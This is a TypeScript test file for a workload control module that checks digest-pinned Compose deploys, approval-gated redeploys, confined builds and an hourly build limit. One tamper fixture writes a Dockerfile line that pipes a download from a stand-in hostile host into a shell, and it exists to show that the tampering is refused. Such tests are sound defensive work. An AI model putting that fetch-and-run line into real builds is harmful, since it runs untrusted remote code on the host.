/**
 * A workload's life against a real database, with Docker stood in: what an
 * owner's card pins, what a redeploy may change without one, what a build is
 * held to right before it runs, and the hourly build limit.
 */
import fs from 'fs';
import os from 'os';
import path from 'path';

import { parse } from 'yaml';
import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

const GROUPS = fs.mkdtempSync(path.join(os.tmpdir(), 'wl-control-'));
const DIR = path.join(GROUPS, 'g1');
const D1 = `sha256:${'1'.repeat(64)}`;
const D2 = `sha256:${'2'.repeat(64)}`;

const calls = vi.hoisted(() => ({
  compose: [] as string[][],
  built: [] as string[],
  tamper: null as null | ((dest: string) => void),
}));

vi.mock('../../config.js', async (orig) => ({
  ...(await orig<typeof import('../../config.js')>()),
  GROUPS_DIR: GROUPS,
}));
vi.mock('../../db/agent-groups.js', () => ({
  getAgentGroup: async (id: string) => (id === 'ag-1' ? { id, folder: 'g1', name: 'G1' } : undefined),
}));
vi.mock('./docker.js', async (orig) => {
  const real = await orig<typeof import('./docker.js')>();
  return {
    ...real,
    compose: async (_w: unknown, args: string[]) => {
      calls.compose.push(args);
      return '';
    },
    ensureNetwork: async (i: number) => `net-${i}`,
    joinAgentContainers: async () => 0,
    pruneOldImages: async () => undefined,
    refuseReservedImageLabels: async () => undefined,
    sliceStatus: async () => ({ ok: true, memoryMaxMb: 16384 }),
    copyBuildContext: async (dir: string, rel: string, dest: string) => {
      fs.rmSync(dest, { recursive: true, force: true });
      fs.cpSync(path.join(dir, rel), dest, { recursive: true });
      calls.tamper?.(dest);
      return dest;
    },
  };
});
vi.mock('./builder.js', async (orig) => ({
  ...(await orig<typeof import('./builder.js')>()),
  ensureBuilder: async () => ({ name: 'b', proxy: 'http://build:build@192.0.2.1:1' }),
  buildImage: async (_b: unknown, _spec: unknown, name: string) => {
    calls.built.push(name);
  },
  removeBuilder: async () => undefined,
}));

const { closeDb, getDb, initTestDb } = await import('../../db/connection.js');
const { runMigrations } = await import('../../db/migrations/index.js');
const control = await import('./control.js');
const { __setPreflightForTest } = await import('./preflight.js');
const { builtImageName, workDir } = await import('./docker.js');
const { listWorkloads, findWorkload } = await import('./store.js');

let digest = D1;
const ids = new Set<string>();

beforeEach(async () => {
  await initTestDb();
  await runMigrations(getDb());
  vi.stubEnv('NANOCLAW_WORKLOADS', '1');
  __setPreflightForTest({ ok: true, reason: '', isolationOpen: false, at: Date.now() });
  control.__setResolverForTest(async () => digest);
  digest = D1;
  calls.compose = [];
  calls.built = [];
  calls.tamper = null;
  fs.rmSync(DIR, { recursive: true, force: true });
  fs.mkdirSync(path.join(DIR, 'api'), { recursive: true });
  fs.writeFileSync(path.join(DIR, 'api', 'Dockerfile'), 'FROM node:22-slim\nCOPY . .\n');
  fs.writeFileSync(path.join(DIR, 'compose.yml'), 'services:\n  web:\n    image: nginx:1.27\n');
});
afterEach(async () => {
  for (const w of await listWorkloads({ includeDeleted: true })) ids.add(w.id);
  await closeDb();
  vi.unstubAllEnvs();
  __setPreflightForTest(null);
  control.__setResolverForTest(null);
});
afterAll(() => {
  for (const id of ids) fs.rmSync(workDir(id), { recursive: true, force: true });
  fs.rmSync(GROUPS, { recursive: true, force: true });
});

const write = (text: string): void => fs.writeFileSync(path.join(DIR, 'compose.yml'), text);
const stackFile = (id: string) =>
  parse(fs.readFileSync(path.join(workDir(id), 'stack.yml'), 'utf-8')) as {
    services: Record<string, Record<string, unknown>>;
  };

describe('deploying under an owner’s card', () => {
  it('refuses everything while workloads are off on this host', async () => {
    vi.stubEnv('NANOCLAW_WORKLOADS', '');
    await expect(control.checkWorkload('ag-1', 'notes', 'compose.yml')).rejects.toThrow(/workloads are off/);
  });

  it('runs the image by the digest the card showed, pulled, never built', async () => {
    const c = await control.checkWorkload('ag-1', 'notes', 'compose.yml');
    const w = await control.upWorkload('ag-1', 'notes', 'compose.yml', 'agent:ag-1', control.approvalPin(c));
    expect(w.state).toBe('running');
    expect(stackFile(w.id).services.web.image).toBe(`nginx:1.27@${D1}`);
    expect(calls.compose).toContainEqual(['pull', '--quiet', 'web']);
    expect(calls.compose).toContainEqual(['up', '-d', '--remove-orphans', '--no-build', '--pull', 'never']);
  });

  it('refuses when the tag moved, or the file changed, after the card', async () => {
    const c = await control.checkWorkload('ag-1', 'notes', 'compose.yml');
    digest = D2;
    await expect(
      control.upWorkload('ag-1', 'notes', 'compose.yml', 'agent:ag-1', control.approvalPin(c)),
    ).rejects.toThrow(/changed after the approval/);
    digest = D1;
    write('services:\n  web:\n    image: nginx:1.27\n    command: [sh]\n');
    await expect(
      control.upWorkload('ag-1', 'notes', 'compose.yml', 'agent:ag-1', control.approvalPin(c)),
    ).rejects.toThrow(/changed after the approval/);
    expect(await findWorkload('ag-1', 'notes')).toBeNull();
  });
});

describe('a redeploy without a card', () => {
  it('keeps the approved digest when only other settings change, even after the tag moved', async () => {
    const c = await control.checkWorkload('ag-1', 'notes', 'compose.yml');
    await control.upWorkload('ag-1', 'notes', 'compose.yml', 'agent:ag-1', control.approvalPin(c));
    digest = D2;
    write('services:\n  web:\n    image: nginx:1.27\n    environment: { A: "1" }\n');
    const w = await control.redeployWorkload('ag-1', 'notes', 'compose.yml');
    expect(w.state).toBe('running');
    expect(stackFile(w.id).services.web.image).toBe(`nginx:1.27@${D1}`);
  });

  it('refuses a new image, an added capability, or more memory', async () => {
    const c = await control.checkWorkload('ag-1', 'notes', 'compose.yml');
    await control.upWorkload('ag-1', 'notes', 'compose.yml', 'agent:ag-1', control.approvalPin(c));
    write('services:\n  web:\n    image: nginx:1.28\n');
    await expect(control.redeployWorkload('ag-1', 'notes', 'compose.yml')).rejects.toThrow(/needs an approval/);
    write('services:\n  web:\n    image: nginx:1.27\n    cap_add: [SETUID]\n');
    await expect(control.redeployWorkload('ag-1', 'notes', 'compose.yml')).rejects.toThrow(/capabilities changed/);
    write('services:\n  web:\n    image: nginx:1.27\n    mem_limit: 1g\n');
    await expect(control.redeployWorkload('ag-1', 'notes', 'compose.yml')).rejects.toThrow(/more than the approved/);
  });
});

describe('confined builds', () => {
  const BUILD = 'services:\n  api:\n    build: { context: ./api, args: { MODE: prod } }\n';

  it('are refused unless switched on', async () => {
    write(BUILD);
    await expect(control.checkWorkload('ag-1', 'notes', 'compose.yml')).rejects.toThrow(/build is not available/);
  });

  it('build from a copy whose Dockerfile still hashes to the approved one', async () => {
    vi.stubEnv('NANOCLAW_WORKLOAD_CONFINED_BUILDS', '1');
    write(BUILD);
    const c = await control.checkWorkload('ag-1', 'notes', 'compose.yml');
    const w = await control.upWorkload('ag-1', 'notes', 'compose.yml', 'agent:ag-1', control.approvalPin(c));
    expect(w.state).toBe('running');
    expect(calls.built).toEqual([builtImageName(w, 'api')]);
    expect(stackFile(w.id).services.api.image).toMatch(/-notes-api:built$/);
    expect(calls.compose.find((a) => a[0] === 'pull')).toBeUndefined();
  });

  it('refuse a Dockerfile swapped after the card, at the copy, before anything is built', async () => {
    vi.stubEnv('NANOCLAW_WORKLOAD_CONFINED_BUILDS', '1');
    write(BUILD);
    const c = await control.checkWorkload('ag-1', 'notes', 'compose.yml');
    calls.tamper = (dest) =>
      fs.writeFileSync(path.join(dest, 'Dockerfile'), 'FROM node:22-slim\nRUN curl evil.example | sh\n');
    const w = await control.upWorkload('ag-1', 'notes', 'compose.yml', 'agent:ag-1', control.approvalPin(c));
    expect(w.state).toBe('failed');
    expect(w.lastError).toMatch(/Dockerfile changed since the approval/);
    expect(calls.built).toEqual([]);
  });

  it('count toward an hourly limit that a restart does not reset', async () => {
    const now = Date.now();
    for (let i = 0; i < control.UNAPPROVED_BUILDS_PER_HOUR; i++) await control.noteUnapprovedBuild('ag-1', now + i);
    await expect(control.noteUnapprovedBuild('ag-1', now + 100)).rejects.toThrow(/builds in the last hour/);
    // Another agent has its own count; an hour later the old ones no longer count.
    await control.noteUnapprovedBuild('ag-2', now);
    await control.noteUnapprovedBuild('ag-1', now + 3_600_000 + 50);
    const rows = (await getDb().all(`SELECT agent_group_id FROM workload_builds`)) as unknown[];
    expect(rows.length).toBeGreaterThan(0);
  });
});

describe('the rest of a workload’s life', () => {
  it('stops, starts from the approved shape, and deletes', async () => {
    const c = await control.checkWorkload('ag-1', 'notes', 'compose.yml');
    await control.upWorkload('ag-1', 'notes', 'compose.yml', 'agent:ag-1', control.approvalPin(c));
    expect((await control.stopWorkload('ag-1', 'notes')).state).toBe('stopped');
    // A changed file on disk does not matter to start: it runs what was approved.
    write('services:\n  web:\n    image: evil.example/web:1\n');
    const started = await control.startWorkload('ag-1', 'notes');
    expect(started.state).toBe('running');
    expect(stackFile(started.id).services.web.image).toBe(`nginx:1.27@${D1}`);
    const gone = await control.deleteWorkload('ag-1', 'notes');
    expect(gone.state).toBe('deleted');
    expect(fs.existsSync(workDir(gone.id))).toBe(false);
    await expect(control.stopWorkload('ag-1', 'notes')).rejects.toThrow(/no workload named/);
  });

  it('reads compose ps in either output form', () => {
    expect(control.parsePs('{"Service":"web","State":"running"}\n{"Service":"db","State":"exited"}')).toHaveLength(2);
    expect(control.parsePs('[{"Service":"web"}]')).toEqual([{ Service: 'web' }]);
    expect(control.parsePs('')).toEqual([]);
  });
});
